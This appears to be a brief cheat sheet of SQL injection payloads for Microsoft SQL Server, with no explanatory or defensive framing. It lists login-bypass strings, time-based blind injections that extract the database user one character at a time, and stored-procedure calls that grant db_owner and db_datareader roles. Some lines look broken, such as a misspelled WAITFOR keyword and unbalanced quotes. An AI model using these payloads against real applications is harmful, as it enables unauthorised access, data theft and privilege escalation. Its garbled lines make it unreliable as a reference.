Getting top user and bypassing login (easy)
```python
# User field
' OR username = (SELECT TOP 1 username FROM users) --
# Pass field
' OR 1 = 1 --
```

Some blind sqli
```python
'; IF ASCII(SUBSTRING(SYSTEM_USER,1,1)) < 100 WAITFOR DELAY '00:00:05    # First character
'; IF ASCII(SUBSTRING(SYSTEM_USER,2,1)) < 100 WAITFOR DELAY '00:00:05    # Second character
...
'; IF ASCII(SUBSTRING(USER_NAME(),1,1)) < 100 WAITFOR DELAY '00:00:05    # Should be database username
```

Add user roles
```
'; EXEC sp_addrolemember 'db_owner','Schema'; WAITFOORR DELAY '00:00:05
'; EXEC sp_addrolemember 'db_datareader','Schema'; WAITFOORR DELAY '00:00:05
```
